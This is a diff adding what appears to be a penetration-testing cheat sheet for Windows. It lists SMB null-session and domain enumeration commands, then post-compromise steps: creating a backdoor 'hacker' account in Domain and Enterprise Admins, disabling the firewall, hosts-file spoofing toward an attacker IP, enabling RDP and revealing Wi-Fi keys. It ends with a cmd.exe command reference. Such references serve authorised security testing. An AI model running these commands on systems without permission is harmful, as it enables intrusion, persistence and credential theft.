@@ -1,0 +1,326 @@
+Windows
+
+
+# Anonymous users can obtain the Windows password policy
+
+msf > use auxiliary/scanner/smb/smb_enumusers 
+------------------------------------------------------------------------------------------------------
+
+# CIFS NULL Session Permitted
+
+enum4linux -a <target IP>
+
+rpcclient -U "" <target IP>
+Enter  's password: <return>
+rpcclient $> 
+  srvinfo
+  enumdomusers
+  queryuser <user>
+  netshareenum
+  netshareenumall
+  querydominfo
+  getdompwinfo
+
+net use \\target IP\ipc$ "" /u:""            # Windows
+------------------------------------------------------------------------------------------------------
+
+# CIFS Share Writeable By Everyone
+
+Places > Network > Browse Network
+
+------------------------------------------------------------------------------------------------------
+
+# Connect anonymously
+
+smbclient -N -L <target IP>
+
+# Connect with credentials
+
+smbclient -W domain -U user -L <target IP>
+proxychains smbclient '//10.0.0.10/c$' -U 'domain.local/username%password'
+------------------------------------------------------------------------------------------------------
+
+# NetBIOS and SMB
+
+nmap -Pn -n -T4 -p139,445 --script=smb-check-vulns --script-args=unsafe=1 <target range>
+
+enum -G <target IP>                          # Windows
+enum -P <target IP>
+
+nbtenum -r <target IP>                       # Windows
+nbtenum -q <target IP>
+
+nbtscan -r <target range>
+nbtscan -f hosts.txt
+------------------------------------------------------------------------------------------------------
+
+# Show domain users and group information
+
+DumpSec
+------------------------------------------------------------------------------------------------------
+
+# Show members of domain groups
+
+global.exe "domain admins" \\dc-controller
+------------------------------------------------------------------------------------------------------
+
+# Search all folders for filenames that include 'password'.
+
+dir /s /p *password*.*                       # Windows
+------------------------------------------------------------------------------------------------------
+
+# net commands
+
+net accounts                                 # Local password policies.
+net accounts /domain
+net config workstation
+net localgroup                               # Local Security Groups.
+net localgroup /domain                       # Domain Security Groups.
+net localgroup Administrators                # Users in the local Administrators Security Group.
+net localgroup Administrators /domain        # Users in the domain Administrators Security Group.
+net share
+net user                                     # Local users.
+net user /domain > users.txt                 # All users in the current user's domain (take a few to run).
+net user hacker /domain                      # Info on domain user.
+net view                                     # Computers in the users domain and other domains.
+net view /domain                             # Computers in other domain.
+
+net user hacker password /add
+net localgroup administrators /add hacker
+------------------------------------------------------------------------------------------------------
+
+# Domain accounts
+
+net group “Domain Admins" /domain > domain-admin.txt
+net group “Domain Users" /domain > domain-users.txt
+
+net user hacker password /add /domain
+net group "Enterprise Admins" hacker /add /domain
+net groups "Enterprise Admins" /domain
+------------------------------------------------------------------------------------------------------
+
+# Domain control
+
+nbtstat -a <target IP>
+
+The netbios hex code “1C” next to the domain name signifies that the system being polled is a domain 
+controller for the domain name listed on the left. If the “1C” would have been next to an Inet service
+it would have signified it was an IIS server.
+
+Note the differences between the U and the G. U = UNIQUE and G = GROUP. When you see a hex code next 
+to UNIQUE it is usually associated with the computer itself. With GROUP it is associated with the 
+workgroup or domain: https://support.microsoft.com/en-us/kb/163409
+------------------------------------------------------------------------------------------------------
+
+# Enumeration
+ 
+arp -a
+ipconfig /all
+ipconfig /displaydns
+netstat -ano
+netstat -ano | findstr LISTENING
+netstat -c
+netstat -ns
+netstat -vb
+route print
+
+date /t & time /t
+doskey /history
+gpresult /COMPUTERNAME
+gpresult /%username%
+gpresult /z
+nbtstat -A <target IP>
+nbtstat -a <name of target>
+net group
+net group administrators
+net session
+net start
+set
+tasklist /m
+tasklist /svc
+tasklist /v
+
+dir c:\*.xls /s                         # Show all Excel docs.
+dir c:\*.xlsx /s                        # Show all Excel docs.
+dir c:\*.ppt /s                         # Show all PowerPoint docs.
+dir c:\*.pptx /s                        # Show all PowerPoint docs.
+dir c:\*.doc /s                         # Show all Word docs.
+dir c:\*.docx /s                        # Show all Word docs.
+dir c:\*.pdf /s                         # Show all PDFs.
+------------------------------------------------------------------------------------------------------
+
+# Firewall
+
+netsh firewall show config
+netsh firewall add portopening TCP 8081 ePO
+netsh firewall set opmode disable       # Disable firewall.
+
+firewall show state
+netsh firewall set opmode disable
+
+netsh wlan show interfaces
+netsh wlan show drivers
+netsh wlan show networks
+netsh wlan show profiles
+netsh wlan show profiles name="name"
+show profiles name="name" key=clear
+------------------------------------------------------------------------------------------------------
+
+# Local DNS spoofing
+
+echo <attacker IP> facebook >> %WINDIR%\System32\drivers\etc\hosts
+type %WINDIR%\System32\drivers\etc\hosts
+------------------------------------------------------------------------------------------------------
+
+# Misc
+
+cd \WINDOWS\system32\
+type %SYSTEMDRIVE%\boot.ini
+type %WINDIR%\win.ini
+fsutil fsinfo drives
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh rdesktop <target-IP>
+------------------------------------------------------------------------------------------------------
+
+# Commands
+
+ASSOC           Displays or modifies file extension associations.
+ARP				
+AT				
+ATTRIB          Displays or changes file attributes.
+BREAK           Sets or clears extended CTRL+C checking.
+BOOTCFG         Sets properties in boot.ini file to control boot loading.
+CALC	        Start the Calculator.
+CACLS           Displays or modifies access control lists (ACLs) of files.
+CALL            Calls one batch program from another.
+CD              Displays the name of or changes the current directory.
+CHCP            Displays or sets the active code page number.
+CHDIR           Displays the name of or changes the current directory.
+CHKDSK          Checks a disk and displays a status report.
+CHKNTFS         Displays or modifies the checking of disk at boot time.
+CLS             Clears the screen.
+CMD             Starts a new instance of the Windows command interpreter.
+COLOR           Sets the default console foreground and background colors.
+COMP            Compares the contents of two files or sets of files.
+COMPACT         Displays or alters the compression of files on NTFS partitions.
+CONVERT         Converts FAT volumes to NTFS.  You cannot convert the current drive.
+COPY            Copies one or more files to another location.
+DATE            Displays or sets the date.
+DEL             Deletes one or more files.
+DIR             Displays a list of files and subdirectories in a directory.
+DISKCOMP        Compares the contents of two floppy disks.
+DISKCOPY        Copies the contents of one floppy disk to another.
+DISKPART        Displays or configures Disk Partition properties.
+DOSKEY          Edits command lines, recalls Windows commands, and creates macros.
+DRIVERQUERY     Displays current device driver status and properties.
+ECHO            Displays messages, or turns command echoing on or off.
+ENDLOCAL        Ends localization of environment changes in a batch file.
+ERASE           Deletes one or more files.
+EVENTQUERY      Displays event log entries for specified criteria.
+EVENTVWR        Displays the Event Viewer.
+EXIT            Quits the CMD.EXE program.
+FC              Compares two files or sets of files, and displays the differences between them.
+FIND            Searches for a text string in a file or files.
+FINDSTR         Searches for strings in files.
+FOR             Runs a specified command for each file in a set of files.
+FORMAT          Formats a disk for use with Windows.
+FREEDISK		     
+FSUTIL          Displays or configures the file system properties.
+FTYPE           Displays or modifies file types used in file extension associations.
+GETMAC	        Display the MAC of network cards.
+GETTYPE         Displays the OS version.
+GOTO            Directs the Windows command interpreter to a labeled line in a batch program.
+GPMC.MSC        Group Policy management console.
+GPRESULT        Displays Group Policy information for machine or user.
+GPUPDATE		     
+GRAFTABL        Enables Windows to display an extended character set in graphics mode.
+HELP            Provides Help information for Windows commands.
+HOSTNAME		     
+IF              Performs conditional processing in batch programs.
+IPCONFIG		     
+LABEL           Creates, changes, or deletes the volume label of a disk.
+MD              Creates a directory.
+MKDIR           Creates a directory.
+MMC	        Microsoft Management Console.
+MODE            Configures a system device.
+MORE            Displays output one screen at a time.
+MOVE            Moves one or more files from one directory to another directory.
+MSTSC	        Remote Desktop
+NBTSTAT			
+NET ACCOUNTS    Password properties.
+NET GROUP		     
+NET LOCALGROUP  Display local security groups.
+NET SHARE       Display local shares.
+NET START       Show services running.
+NET USE	        Display mapped drives.
+NET USER		     
+NET VIEW		     
+NOTEPAD		     
+NSLOOKUP		     
+OPENFILES       Displays files opened by remote users for a file share.
+PAGEFILECONFIG  Displays or configures Pagefile properties.
+PATH            Displays or sets a search path for executable files.
+PAUSE           Suspends processing of a batch file and displays a message.
+PING			     
+POPD            Restores the previous value of the current directory saved by PUSHD.
+PRINT           Prints a text file.
+PROMPT          Changes the Windows command prompt.
+PUSHD           Saves the current directory then changes it.
+RD              Removes a directory.
+RECOVER         Recovers readable information from a bad or defective disk.
+REGEDIT			
+REM             Records comments (remarks) in batch files or CONFIG.SYS.
+REN             Renames a file or files.
+RENAME          Renames a file or files.
+REPLACE         Replaces files.
+RMDIR           Removes a directory.
+SET             Displays, sets, or removes Windows environment variables.
+SETLOCAL        Begins localization of environment changes in a batch file.
+SC              Displays or configures services (background processes).
+SCHTASKS        Schedules commands and programs to run on a computer.
+SHIFT           Shifts the position of replaceable parameters in batch files.
+SHUTDOWN        Allows proper local or remote shutdown of machine.
+SORT            Sorts input.
+START           Starts a separate window to run a specified program or command.
+SUBST           Associates a path with a drive letter.
+SYSTEMINFO      Displays machine specific properties and configuration.
+TASKLIST        Displays all currently running tasks including services.
+TASKKILL        Kill or stop a running process or application.
+TASKMGR         Task Manager
+TIME            Displays or sets the system time.
+TITLE           Sets the window title for a CMD.EXE session.
+TRACERT		     
+TREE            Graphically displays the directory structure of a drive or path.
+TYPE            Displays the contents of a text file.
+TZCHANGE        Configure the time zone.
+VER             Displays the Windows version.
+VERIFY          Tells Windows whether to verify that your files are written correctly to a disk.
+VOL             Displays a disk volume label and serial number.
+XCOPY           Copies files and directory trees.
+WHOAMI			
+WMIC            Displays WMI information inside interactive command shell.
+WUPDMGR		     
+
+appwiz.cpl	Add or Remove Programs
+cls		Clear screen
+cmd		Start a new Command shell
+date		Current date
+devmgmt.msc	Device Manager
+dsa.msc		Active Directory Users and Computers
+eventvwr.msc	Event Viewer
+firewall.cpl	Windows Firewall
+mstsc		Remote Desktop
+services.msc	Services
+set		Environmental variables
+tasklist	Programs running
+tasklist /svc	Services running
+------------------------------------------------------------------------------------------------------
+
+# Environmental Variables
+
+%ProgramFiles%
+%SystemRoot%
+%TEMP%
+%windir%
